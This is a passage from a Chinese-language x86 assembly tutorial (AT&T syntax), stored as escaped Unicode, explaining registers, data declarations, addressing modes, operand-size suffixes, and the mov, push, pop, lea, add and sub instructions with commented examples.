\u4e2a\u5b57\u8282\u4e5f\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a 8 \u4f4d\u5bc4\u5b58\u5668 ( AH ). \u8fd9\u4e9b\u540d\u79f0\u6709\u5b83\u4eec\u76f8\u5bf9\u5e94\u7684\u7269\u7406\u5bc4\u5b58\u5668. \u5f53\u4e24\u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u88ab\u653e\u5230 DX \u7684\u65f6\u5019, \u539f\u672c DH , DL \u548c EDX \u7684\u6570\u636e\u4f1a\u53d7\u5230\u5f71\u54cd ( \u88ab\u8986\u76d6\u4e4b\u7c7b\u7684 ). \u8fd9\u4e9b \" \u5b50\u5bc4\u5b58\u5668 \" \u4e3b\u8981\u6765\u81ea\u4e8e\u6bd4\u8f83\u4e45\u8fdc\u7684 16 \u4f4d\u7248\u672c\u6307\u4ee4\u96c6. \u7136\u800c, \u59dc\u8fd8\u662f\u8001\u7684\u8fa3, \u5728\u5904\u7406\u5c0f\u4e8e 32 \u4f4d\u7684\u6570\u636e\u7684\u65f6\u5019, \u6bd4\u5982 1 \u4e2a\u5b57\u8282\u7684 ASCII \u5b57\u7b26, \u5b83\u4eec\u6709\u65f6\u4f1a\u5f88\u65b9\u4fbf. 3.3.3 \u5185\u5b58\u548c\u5bfb\u5740\u6a21\u5f0f Memory and Addressing Modes 3.3.3.1 \u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df \u4f60\u53ef\u4ee5\u7528\u7279\u6b8a\u7684 x86 \u6c47\u7f16\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df ( \u7c7b\u4f3c\u4e8e\u5168\u5c40\u53d8\u91cf ). .data \u6307\u4ee4\u7528\u6765\u58f0\u660e\u6570\u636e. \u6839\u636e\u8fd9\u6761\u6307\u4ee4, .byte , .short \u548c .long \u53ef\u4ee5\u5206\u522b\u7528\u6765\u58f0\u660e 1 \u4e2a\u5b57\u8282, 2 \u4e2a\u5b57\u8282\u548c 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e. \u6211\u4eec\u53ef\u4ee5\u7ed9\u5b83\u4eec\u6253\u4e2a\u6807\u7b7e, \u7528\u6765\u5f15\u7528\u521b\u5efa\u7684\u6570\u636e\u7684\u5730\u5740. \u6807\u7b7e\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d\u662f\u975e\u5e38\u6709\u7528\u7684, \u5b83\u4eec\u7ed9\u5185\u5b58\u5730\u5740\u547d\u540d, \u7136\u540e \u7f16\u8bd1\u5668 \u548c \u94fe\u63a5\u5668 \u5c06\u5176 \" \u7ffb\u8bd1 \" \u6210\u8ba1\u7b97\u673a\u7406\u89e3\u7684\u673a\u5668\u4ee3\u7801. \u8fd9\u4e2a\u8ddf\u7528\u540d\u79f0\u6765\u58f0\u660e\u53d8\u91cf\u5f88\u7c7b\u4f3c, \u4f46\u662f\u5b83\u9075\u5b88\u4e00\u4e9b\u8f83\u4f4e\u7ea7\u522b\u7684\u89c4\u5219. \u4f8b\u5982, \u6309\u987a\u5e8f\u58f0\u660e\u7684\u4f4d\u7f6e\u5c06\u5f7c\u6b64\u76f8\u90bb\u5730\u5b58\u50a8\u5728\u5185\u5b58\u4e2d. \u8fd9\u8bdd\u4e5f\u8bb8\u6709\u70b9\u7ed5, \u5c31\u662f\u6309\u7167\u987a\u5e8f\u6253\u7684\u6807\u7b7e, \u8fd9\u4e9b\u6807\u7b7e\u5bf9\u5e94\u7684\u6570\u636e\u4e5f\u4f1a\u6309\u7167\u987a\u5e8f\u88ab\u653e\u5230\u5185\u5b58\u4e2d. \u4e00\u4e9b\u4f8b\u5b50 : .data var : .byte 64 ;\u58f0\u660e\u4e00\u4e2a\u5b57\u8282\u578b\u53d8\u91cf var, \u5176\u6240\u5bf9\u5e94\u7684\u6570\u636e\u662f64 .byte 10 ;\u58f0\u660e\u4e00\u4e2a\u6570\u636e 10, \u8fd9\u4e2a\u6570\u636e\u6ca1\u6709\u6240\u8c13\u7684 \" \u6807\u7b7e \", \u5b83\u7684\u5185\u5b58\u5730\u5740\u5c31\u662f var+1. x : .short 42 ;\u58f0\u660e\u4e00\u4e2a\u5927\u5c0f\u4e3a 2 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e2a\u6570\u636e\u6709\u4e2a\u6807\u7b7e \" x \" y : .long 30000 ;\u58f0\u660e\u4e00\u4e2a\u5927\u5c0f\u4e3a 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e2a\u6570\u636e\u6807\u7b7e\u662f \" y \", y \u7684\u503c\u88ab\u521d\u59cb\u5316\u4e3a 30000 \u4e0e\u9ad8\u7ea7\u8bed\u8a00\u4e0d\u540c, \u9ad8\u7ea7\u8bed\u8a00\u7684\u6570\u7ec4\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u7ef4\u5ea6\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u6765\u8bbf\u95ee, x86 \u6c47\u7f16\u8bed\u8a00\u7684\u6570\u7ec4\u53ea\u662f\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u7684\" \u5355\u5143\u683c \". \u4f60\u53ea\u9700\u8981\u628a\u6570\u503c\u5217\u51fa\u6765\u5c31\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u6570\u7ec4, \u6bd4\u5982\u4e0b\u9762\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50. \u5bf9\u4e8e\u4e00\u4e9b\u5b57\u8282\u578b\u6570\u7ec4\u7684\u7279\u6b8a\u60c5\u51b5, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32. \u5982\u679c\u8981\u5728\u5927\u591a\u6570\u7684\u5185\u5b58\u586b\u5145 0, \u4f60\u53ef\u4ee5\u4f7f\u7528 .zero \u6307\u4ee4. \u4f8b\u5b50 : s : .long 1, 2, 3 ;\u58f0\u660e 3 \u4e2a\u5927\u5c0f\u4e3a 4 \u5b57\u8282\u7684\u6570\u636e 1, 2, 3. \u5185\u5b58\u4e2d s+8 \u8fd9\u4e2a\u6807\u7b7e\u6240\u5bf9\u5e94\u7684\u6570\u636e\u5c31\u662f 3. barr: .zero 10 ;\u4ece barr \u8fd9\u4e2a\u6807\u7b7e\u7684\u4f4d\u7f6e\u5f00\u59cb, \u58f0\u660e 10 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e9b\u6570\u636e\u88ab\u521d\u59cb\u5316\u4e3a 0. str : .string \"hello\" ;\u4ece str \u8fd9\u4e2a\u6807\u7b7e\u7684\u4f4d\u7f6e\u5f00\u59cb, \u58f0\u660e 6 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u5373 hello \u5bf9\u5e94\u7684 ASCII \u503c, \u8fd9\u6700\u540e\u8fd8\u8ddf\u6709\u4e00\u4e2a nul(0) \u5b57\u8282. 3.3.3.2 \u5185\u5b58\u5bfb\u5740 \u73b0\u4ee3x86\u517c\u5bb9\u5904\u7406\u5668\u80fd\u591f\u5bfb\u5740\u9ad8\u8fbe 2^32 \u5b57\u8282\u7684\u5185\u5b58 : \u5185\u5b58\u5730\u5740\u4e3a 32 \u4f4d\u5bbd. \u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u6807\u7b7e\u6765\u5f15\u7528\u5185\u5b58\u533a\u57df\uff0c\u8fd9\u4e9b\u6807\u7b7e\u5b9e\u9645\u4e0a\u88ab 32 \u4f4d\u6570\u636e\u7684\u6c47\u7f16\u7a0b\u5e8f\u66ff\u6362\uff0c\u8fd9\u4e9b\u6570\u636e\u6307\u5b9a\u4e86\u5185\u5b58\u4e2d\u7684\u5730\u5740. \u9664\u4e86\u652f\u6301\u901a\u8fc7\u6807\u7b7e\uff08\u5373\u5e38\u6570\u503c\uff09\u5f15\u7528\u5b58\u50a8\u533a\u57df\u4e4b\u5916\uff0cx86\u63d0\u4f9b\u4e86\u4e00\u79cd\u7075\u6d3b\u7684\u8ba1\u7b97\u548c\u5f15\u7528\u5185\u5b58\u5730\u5740\u7684\u65b9\u6848 \uff1a\u6700\u591a\u53ef\u5c06\u4e24\u4e2a32\u4f4d\u5bc4\u5b58\u5668\u548c\u4e00\u4e2a32\u4f4d\u6709\u7b26\u53f7\u5e38\u91cf\u76f8\u52a0\uff0c\u4ee5\u8ba1\u7b97\u5b58\u50a8\u5668\u5730\u5740. \u5176\u4e2d\u4e00\u4e2a\u5bc4\u5b58\u5668\u53ef\u4ee5\u9009\u62e9\u9884\u5148\u4e58\u4ee5 2, 4 \u6216 8. \u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u548c\u8bb8\u591a x86 \u6307\u4ee4\u4e00\u8d77\u4f7f\u7528 ( \u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u5bf9\u5b83\u4eec\u8fdb\u884c\u8bb2\u89e3 ). \u8fd9\u91cc\u6211\u4eec\u7528 mov \u6307\u4ee4\u5728\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\u79fb\u52a8\u6570\u636e\u5f53\u4f5c\u4f8b\u5b50. \u8fd9\u4e2a\u6307\u4ee4\u6709\u4e24\u4e2a\u53c2\u6570, \u7b2c\u4e00\u4e2a\u662f\u6570\u636e\u7684\u6765\u6e90, \u7b2c\u4e8c\u4e2a\u662f\u6570\u636e\u7684\u53bb\u5411. \u4e00\u4e9b mov \u7684\u4f8b\u5b50 : mov (%ebx), %eax ;\u4ece EBX \u4e2d\u7684\u5185\u5b58\u5730\u5740\u52a0\u8f7d 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e\u5230 EAX, \u5c31\u662f\u628a EBX \u4e2d\u7684\u5185\u5bb9\u5f53\u4f5c\u6807\u7b7e, \u8fd9\u4e2a\u6807\u7b7e\u5728\u5185\u5b58\u4e2d\u5bf9\u5e94\u7684\u6570\u636e\u653e\u5230 EAX \u4e2d ;\u540e\u9762\u5982\u679c\u6ca1\u6709\u8bf4\u660e\u7684\u8bdd, (%ebx)\u5c31\u8868\u793a\u5bc4\u5b58\u5668ebx\u4e2d\u5b58\u50a8\u7684\u5185\u5bb9 mov %ebx, var(,1) ; \u5c06 EBX \u4e2d\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u79fb\u52a8\u7684\u5185\u5b58\u4e2d\u6807\u7b7e\u4e3a var \u7684\u5730\u65b9\u53bb.( var \u662f\u4e00\u4e2a 32 \u4f4d\u5e38\u6570). mov (%esi, %ebx, 4), %edx ;\u5c06\u5185\u5b58\u4e2d\u6807\u7b7e\u4e3a ESI+4*EBX \u6240\u5bf9\u5e94\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u79fb\u52a8\u5230 EDX\u4e2d. \u4e00\u4e9b \u9519\u8bef \u7684\u4f8b\u5b50: mov (%ebx, %ecx, -1), %eax ;\u8fd9\u4e2a\u53ea\u80fd\u628a\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u52a0\u4e0a\u4e00\u904d. mov %ebx,(%eax, %esi, %edi, 1) ;\u5728\u5730\u5740\u8ba1\u7b97\u4e2d, \u6700\u591a\u53ea\u80fd\u51fa\u73b0 2 \u4e2a\u5bc4\u5b58\u5668, \u8fd9\u91cc\u5374\u6709 3 \u4e2a\u5bc4\u5b58\u5668. 3.3.3.3 \u64cd\u4f5c\u540e\u7f00 \u901a\u5e38, \u7ed9\u5b9a\u5185\u5b58\u5730\u5740\u7684\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u4ece\u5f15\u7528\u5b83\u7684\u6c47\u7f16\u6307\u4ee4\u63a8\u65ad\u51fa\u6765. \u4f8b\u5982, \u5728\u4e0a\u9762\u7684\u6307\u4ee4\u4e2d, \u4f60\u53ef\u4ee5\u4ece\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\u7684\u5927\u5c0f\u6765\u63a8\u51fa\u5176\u6240\u5360\u7684\u5185\u5b58\u5927\u5c0f. \u5f53\u6211\u4eec\u52a0\u8f7d\u4e00\u4e2a 32 \u4f4d\u7684\u5bc4\u5b58\u5668\u7684\u65f6\u5019, \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u63a8\u65ad\u51fa\u6211\u4eec\u7528\u5230\u7684\u5185\u5b58\u5927\u5c0f\u662f 4 \u4e2a\u5b57\u8282\u5bbd. \u5f53\u6211\u4eec\u5c06 1 \u4e2a\u5b57\u8282\u5bbd\u7684\u5bc4\u5b58\u5668\u7684\u503c\u4fdd\u5b58\u5230\u5185\u5b58\u4e2d\u65f6, \u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u51fa\u6211\u4eec\u60f3\u8981\u5728\u5185\u5b58\u4e2d\u5f04\u4e2a 1 \u5b57\u8282\u5927\u5c0f\u7684 \" \u5751 \" \u6765\u4fdd\u5b58\u6211\u4eec\u7684\u6570\u636e. \u7136\u800c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b, \u6211\u4eec\u7528\u5230\u7684\u5185\u5b58\u4e2d \" \u5751 \" \u7684\u5927\u5c0f\u662f\u4e0d\u660e\u786e\u7684. \u6bd4\u5982\u8bf4\u8fd9\u6761\u6307\u4ee4 mov $2,(%ebx) . \u8fd9\u6761\u6307\u4ee4\u662f\u5426\u5e94\u8be5\u5c06 \" 2 \" \u8fd9\u4e2a\u503c\u79fb\u52a8\u5230 EBX \u4e2d\u7684\u503c\u6240\u4ee3\u8868\u7684\u5730\u5740 \" \u5751 \" \u7684\u5355\u4e2a\u5b57\u8282\u4e2d ? \u4e5f\u8bb8\u5b83\u8868\u793a\u7684\u662f\u5c06 32 \u4f4d\u6574\u6570\u8868\u793a\u7684 2 \u79fb\u52a8\u5230\u4ece\u5730\u5740 EBX \u5f00\u59cb\u7684 4 \u5b57\u8282. \u65e2\u7136\u8fd9\u4e24\u4e2a\u89e3\u91ca\u90fd\u6709\u9053\u7406, \u4f46\u8ba1\u7b97\u673a\u6c47\u7f16\u7a0b\u5e8f\u5fc5\u987b\u660e\u786e\u54ea\u4e2a\u89e3\u91ca\u624d\u662f\u6b63\u786e\u7684, \u8ba1\u7b97\u673a\u5f88\u5355\u7eaf\u7684, \u8981\u4e48\u662f\u9519\u7684\u8981\u4e48\u662f\u5bf9\u7684. \u524d\u7f00 b, w, \u548c l \u5c31\u662f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684, \u5b83\u4eec\u5206\u522b\u8868\u793a 1, 2 \u548c 4 \u4e2a\u5b57\u8282\u7684\u5927\u5c0f. \u4e3e\u51e0\u4e2a\u4f8b\u5b50 : movb $2, (%ebx) ;\u5c06 2 \u79fb\u5165\u5230 ebx \u4e2d\u7684\u503c\u6240\u8868\u793a\u7684\u5730\u5740\u5355\u5143\u4e2d. movw $2, (%ebx) ;\u5c06 16 \u4f4d\u6574\u6570 2 \u79fb\u52a8\u5230 \u4ece ebx \u4e2d\u7684\u503c\u6240\u8868\u793a\u7684\u5730\u5740\u5355\u5143 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u4e2d;\u8fd9\u8bdd\u6709\u70b9\u7ed5, \u6240\u4ee5\u6211\u6545\u610f\u5728\u91cc\u9762\u52a0\u4e86\u70b9\u7a7a\u683c, \u65b9\u4fbf\u5927\u5bb6\u7406\u89e3. movl $2,(%ebx) ;\u5c06 32 \u4f4d\u6574\u6570 2 \u79fb\u52a8\u5230 \u4ece ebx\u4e2d\u7684\u503c\u8868\u793a\u7684\u5730\u5740\u5355\u5143 \u5f00\u59cb\u7684 4 \u4e2a\u5b57\u8282\u4e2d. 3.3.4 \u6307\u4ee4 Instructions \u673a\u5668\u6307\u4ee4\u901a\u5e38\u5206\u4e3a 3 \u7c7b : \u6570\u636e\u79fb\u52a8\u6307\u4ee4, \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u548c\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4. \u5728\u672c\u8282\u4e2d, \u6211\u4eec\u5c06\u8bb2\u89e3\u6bcf\u4e00\u79cd\u7c7b\u578b\u7684 x86 \u6307\u4ee4\u4ee5\u53ca\u5b83\u4eec\u7684\u91cd\u8981\u793a\u4f8b. \u5f53\u7136, \u6211\u4eec\u4e0d\u53ef\u80fd\u628a x86 \u6240\u6709\u6307\u4ee4\u8bb2\u5f97\u7279\u522b\u8be6\u7ec6, \u6bd5\u7adf\u7bc7\u5e45\u548c\u6c34\u5e73\u6709\u9650. \u5b8c\u6574\u7684\u6307\u4ee4\u5217\u8868, \u8bf7\u53c2\u9605 intel \u7684\u6307\u4ee4\u96c6\u53c2\u8003\u624b\u518c. \u6211\u4eec\u5c06\u4f7f\u7528\u4ee5\u4e0b\u7b26\u53f7 : <reg32 \u4efb\u610f\u7684 32 \u4f4d\u5bc4\u5b58\u5668 (%eax, %ebx, %ecx, %edx, %esi, %edi, %esp \u6216\u8005 %eb) <reg16 \u4efb\u610f\u7684 16 \u4f4d\u5bc4\u5b58\u5668 (%ax, %bx, %cx \u6216\u8005 %dx) <reg8 \u4efb\u610f\u7684 8 \u4f4d\u5bc4\u5b58\u5668 (%ah, %al, %bh, %bl, %ch, %cl, %dh, %dl) <reg \u4efb\u610f\u7684\u5bc4\u5b58\u5668 <mem \u4e00\u4e2a\u5185\u5b58\u5730\u5740, \u4f8b\u5982 (%eax), 4+var, (%eax, %ebx, 1) <con32 32 \u4f4d\u5e38\u6570 <con16 16 \u4f4d\u5e38\u6570 <con8 8 \u4f4d\u5e38\u6570 <con \u4efb\u610f 32\u4f4d, 16 \u4f4d\u6216\u8005 8 \u4f4d\u5e38\u6570 \u5728\u6c47\u7f16\u8bed\u8a00\u4e2d, \u7528\u4f5c \u7acb\u5373\u64cd\u4f5c\u6570 \u7684\u6240\u6709\u6807\u7b7e\u548c\u6570\u5b57\u5e38\u91cf ( \u5373\u4e0d\u5728\u8bf8\u5982 3 (%eax, %ebx, 8) \u8fd9\u6837\u7684\u5730\u5740\u8ba1\u7b97\u4e2d ) \u603b\u662f\u4ee5\u7f8e\u5143\u7b26\u53f7 $ \u4e3a\u524d\u7f00. \u9700\u8981\u7684\u65f6\u5019, \u524d\u7f00 0x \u8868\u793a\u5341\u516d\u8fdb\u5236\u6570, \u4f8b\u5982 $ 0xABC . \u5982\u679c\u6ca1\u6709\u524d\u7f00, \u5219\u9ed8\u8ba4\u8be5\u6570\u5b57\u4e3a\u5341\u8fdb\u5236\u6570. 3.3.4.1 \u6570\u636e\u79fb\u52a8\u6307\u4ee4 mov \u79fb\u52a8 mov \u6307\u4ee4\u5c06\u6570\u636e\u4ece\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 ( \u5373\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9, \u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9, \u6216\u8005\u4e00\u4e2a\u5e38\u6570\u503c ) \u590d\u5236\u5230\u5b83\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 ( \u5373\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ). \u5f53\u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u4e4b\u95f4\u7684\u6570\u636e\u79fb\u52a8\u662f\u53ef\u884c\u7684\u65f6\u5019, \u76f4\u63a5\u5730\u4ece\u5185\u5b58\u5355\u5143\u4e2d\u5c06\u6570\u636e\u79fb\u52a8\u5230\u53e6\u4e00\u5185\u5b58\u5355\u5143\u4e2d\u662f\u4e0d\u884c\u7684. \u5728\u8fd9\u79cd\u9700\u8981\u5728\u5185\u5b58\u5355\u5143\u4e2d\u4f20\u9012\u6570\u636e\u7684\u60c5\u51b5\u4e0b, \u5b83\u6570\u636e\u6765\u6e90\u7684\u90a3\u4e2a\u5185\u5b58\u5355\u5143\u5fc5\u987b\u9996\u5148\u628a\u90a3\u4e2a\u5185\u5b58\u5355\u5143\u4e2d\u7684\u6570\u636e\u52a0\u8f7d\u5230\u4e00\u4e2a\u5bc4\u5b58\u5668\u4e2d, \u7136\u540e\u624d\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5bc4\u5b58\u5668\u6765\u628a\u6570\u636e\u79fb\u52a8\u5230\u76ee\u6807\u5185\u5b58\u5355\u5143\u4e2d. \u8bed\u6cd5 mov <reg, <reg mov <reg, <mem mov <mem, <reg mov <con, <reg mov <con, <mem \u4f8b\u5b50 mov %ebx, %eax ;\u5c06 EBX \u4e2d\u7684\u503c\u590d\u5236\u5230 EAX \u4e2d mov $5, var(,1) ;\u5c06\u6570\u5b57 5 \u5b58\u5230\u5b57\u8282\u578b\u5185\u5b58\u5355\u5143 \" var \" push \u5165\u6808 push \u6307\u4ee4\u5c06\u5b83\u7684\u53c2\u6570\u79fb\u52a8\u5230\u786c\u4ef6\u652f\u6301\u7684 \u6808 \u5185\u5b58\u9876\u7aef. \u7279\u522b\u5730, push \u9996\u5148\u5c06 ESP \u4e2d\u7684\u503c\u51cf\u5c11 4, \u7136\u540e\u5c06\u5b83\u7684\u53c2\u6570\u79fb\u52a8\u5230\u4e00\u4e2a 32 \u4f4d\u7684\u5730\u5740\u5355\u5143 ( %esp ). ESP ( \u6808\u6307\u9488 ) \u4f1a\u968f\u7740\u4e0d\u65ad\u5165\u6808\u4ece\u800c\u6301\u7eed\u9012\u51cf, \u5373\u6808\u5185\u5b58\u662f\u4ece\u9ad8\u5730\u5740\u5355\u5143\u5230\u4f4e\u5730\u5740\u5355\u5143\u589e\u957f. \u8bed\u6cd5 push <reg32 push <mem push <con32 \u4f8b\u5b50 push %eax ;\u5c06 EAX \u9001\u5165\u6808 push var(,1) ;\u5c06 var \u5bf9\u5e94\u7684 4 \u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u9001\u5165\u6808\u4e2d pop \u51fa\u6808 pop \u6307\u4ee4\u4ece\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u9876\u7aef\u79fb\u9664 4 \u5b57\u8282\u7684\u6570\u636e, \u5e76\u628a\u8fd9\u4e2a\u6570\u636e\u653e\u5230\u8be5\u6307\u4ee4\u6307\u5b9a\u7684\u53c2\u6570\u4e2d ( \u5373\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ). \u5176\u9996\u5148\u5c06\u5185\u5b58\u4e2d ( %esp ) \u7684 4 \u5b57\u8282\u6570\u636e\u653e\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143\u4e2d, \u7136\u540e\u8ba9 ESP + 4. \u8bed\u6cd5 pop <reg32 pop <mem \u4f8b\u5b50 pop %edi ;\u5c06\u6808\u9876\u7684\u5143\u7d20\u79fb\u9664, \u5e76\u653e\u5165\u5230\u5bc4\u5b58\u5668 EDI \u4e2d. pop (%ebx) ;\u5c06\u6808\u9876\u7684\u5143\u7d20\u79fb\u9664, \u5e76\u653e\u5165\u4ece EBX \u5f00\u59cb\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u5185\u5b58\u5355\u5143\u4e2d. \u91cd\u70b9\u5185\u5bb9 : \u6808 \u6808\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5b58\u50a8\u7a7a\u95f4, \u7279\u6b8a\u5728\u5b83\u7684\u8bbf\u95ee\u5f62\u5f0f\u4e0a, \u5b83\u7684\u8bbf\u95ee\u5f62\u5f0f\u5c31\u662f\u6700\u540e\u8fdb\u5165\u8fd9\u4e2a\u7a7a\u95f4\u7684\u6570\u636e, \u6700\u5148\u51fa\u53bb, \u4e5f\u5c31\u662f \"\u5148\u8fdb\u540e\u51fa, \u540e\u8fdb\u5148\u51fa\". lea \u52a0\u8f7d\u6709\u6548\u5730\u5740 lea \u6307\u4ee4\u5c06\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u5185\u5b58\u5355\u5143 \u653e\u5165\u5230 \u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d. \u6ce8\u610f, \u8be5\u6307\u4ee4\u4e0d\u52a0\u8f7d\u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9, \u53ea\u662f\u8ba1\u7b97\u6709\u6548\u5730\u5740\u5e76\u5c06\u5176\u653e\u5165\u5bc4\u5b58\u5668. \u8fd9\u5bf9\u4e8e\u83b7\u5f97\u6307\u5411\u5b58\u50a8\u5668\u533a\u57df\u7684\u6307\u9488\u6216\u8005\u6267\u884c\u7b80\u5355\u7684\u7b97\u672f\u8fd0\u7b97\u975e\u5e38\u6709\u7528. \u4e5f\u8bb8\u8fd9\u91cc\u4f60\u4f1a\u770b\u5f97\u4e00\u5934\u96fe\u6c34, \u4e0d\u8fc7\u4f60\u4e0d\u5fc5\u62c5\u5fc3, \u8fd9\u91cc\u6709\u66f4\u4e3a\u901a\u4fd7\u6613\u61c2\u7684\u89e3\u91ca. \u6c47\u7f16\u8bed\u8a00\u4e2d lea \u6307\u4ee4\u548c mov \u6307\u4ee4\u7684\u533a\u522b ? MOV \u6307\u4ee4\u7684\u529f\u80fd\u662f\u4f20\u9001\u6570\u636e\uff0c\u4f8b\u5982 MOV AX,[1000H] \uff0c\u4f5c\u7528\u662f\u5c06 1000H \u4f5c\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u5bfb\u5740\u627e\u5230\u5185\u5b58\u5355\u5143\uff0c\u5c06\u8be5\u5185\u5b58\u5355\u5143\u4e2d\u7684\u6570\u636e\u9001\u81f3 AX\uff1b LEA \u6307\u4ee4\u7684\u529f\u80fd\u662f\u53d6\u504f\u79fb\u5730\u5740\uff0c\u4f8b\u5982 LEA AX,[1000H] \uff0c\u4f5c\u7528\u662f\u5c06\u6e90\u64cd\u4f5c\u6570 [1000H] \u7684\u504f\u79fb\u5730\u5740 1000H \u9001\u81f3 AX\u3002\u7406\u89e3\u65f6\uff0c\u53ef\u76f4\u63a5\u5c06[ ]\u53bb\u6389\uff0c\u7b49\u540c\u4e8e MOV AX,1000H \u3002 \u518d\u5982\uff1a LEA BX,[AX] \uff0c\u7b49\u540c\u4e8e MOV BX,AX \uff1b LEA BX,TABLE \u7b49\u540c\u4e8e MOV BX,OFFSET TABLE \u3002 \u4f46\u6709\u65f6\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 MOV \u4ee3\u66ff\uff1a \u6bd4\u5982\uff1a LEA AX,[SI+6] \u4e0d\u80fd\u76f4\u63a5\u66ff\u6362\u6210\uff1a MOV AX,SI+6 \uff1b\u4f46\u53ef\u66ff\u6362\u4e3a\uff1a MOV AX,SI ADD AX,6 \u4e24\u6b65\u5b8c\u6210\u3002 \u53c2\u8003\u94fe\u63a5 \u8bed\u6cd5 lea <mem, <reg32 \u4f8b\u5b50 lea (%ebx,%esi,8), %edi ;EBX+8*ESI \u7684\u503c\u88ab\u79fb\u5165\u5230\u4e86 EDI lea val(,1), %eax ;val \u7684\u503c\u88ab\u79fb\u5165\u5230\u4e86 EAX 3.3.4.2 \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4 add \u6574\u6570\u76f8\u52a0 add \u6307\u4ee4\u5c06\u4e24\u4e2a\u53c2\u6570\u76f8\u52a0, \u7136\u540e\u5c06\u7ed3\u679c\u5b58\u653e\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d. \u6ce8\u610f, \u53c2\u6570\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668,\u4f46\u53c2\u6570\u4e2d\u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u5355\u5143. \u8fd9\u8bdd\u6709\u70b9\u7ed5, \u6211\u4eec\u76f4\u63a5\u770b\u8bed\u6cd5 : \u8bed\u6cd5 add <reg, <reg add <mem, <reg add <reg, <mem add <con, <reg add <con, <mem \u4f8b\u5b50 add $10, %eax ;EAX \u4e2d\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3a\u4e86 EAX+10. addb $10, (%eax) ;\u5f80 EAX \u4e2d\u7684\u503c \u6240\u4ee3\u8868\u7684\u5185\u5b58\u5355\u5143\u5730\u5740 \u52a0\u4e0a 1 \u4e2a\u5b57\u8282\u7684\u6570\u5b57 10. sub \u6574\u6570\u76f8\u51cf sub \u6307\u4ee4\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u4e0e\u7b2c\u4e00\u4e2a\u76f8\u51cf, \u5c31\u662f\u540e\u9762\u90a3\u4e2a\u51cf\u53bb\u524d\u9762\u90a3\u4e2a, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u50a8\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570. \u548c add \u4e00\u6837, \u4e24\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668, \u4f46\u4e24\u4e2a\u53c2\u6570\u4e2d\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u662f\u5185\u5b58\u5355\u5143. \u8bed\u6cd5 sub <reg, <reg sub <mem, <reg sub <con, <reg sub <con, <mem \u4f8b\u5b50 sub %ah, %al ;AL \u88ab\u8bbe\u7f6e\u6210 AL-AH sub $216, %eax ;\u5c06 EAX \u4e2d\u7684\u503c\u51cf\u53bb 216 inc, dec \u81ea\u589e, \u81ea\u51cf inc \u6307\u4ee4\u8ba9\u5b83\u7684\u53c2\u6570\u52a0 1, dec \u6307\u4ee4\u5219\u662f\u8ba9\u5b83\u7684\u53c2\u6570\u51cf\u53bb 1. \u8bed\u6cd5 inc 